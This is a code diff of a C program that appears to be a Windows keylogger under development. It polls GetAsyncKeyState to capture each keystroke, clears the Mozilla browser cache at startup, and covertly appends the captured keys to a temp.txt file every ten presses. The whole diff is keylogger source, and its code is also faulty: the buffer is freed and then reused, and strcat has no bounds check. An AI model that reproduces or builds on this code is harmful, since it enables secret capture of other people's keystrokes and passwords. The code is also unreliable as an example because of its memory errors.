@@ -23,22 +23,48 @@ void ClearMozillaCache()
 
 }
 
+//function to call specific browser clear cache functions
 void ClearBrowserCache()
 {
     ClearMozillaCache();
+    //to be added: more browser clear cache functions
+
+}
+
+void Save(int i, char* input)
+{
+    char temp[2] = "";
+    temp[0] = i;
+    temp[1] = '\0';
+    strcat(input,temp);
 
 }
 
 int main()
 {
     ClearMozillaCache();
+    int counter = 0;
+    char* input = (char*)malloc(100*sizeof(char));
+    input[0]='\0';
     while(1)
     {
         for(int i=8; i<190; i++)
         {
             if(GetAsyncKeyState(i) == -32767)
             {
-                printf("%c", i);            
+                //printf("%c", i);
+                counter++;
+                Save(i,input);
+                if(counter == 10)
+                {
+                    counter = 0;
+                    FILE *fp = fopen("temp.txt","ab+");
+                    fprintf(fp,"%s", input);
+                    fclose(fp);
+                    free(input);
+                    
+
+                }            
                 
             }
         }
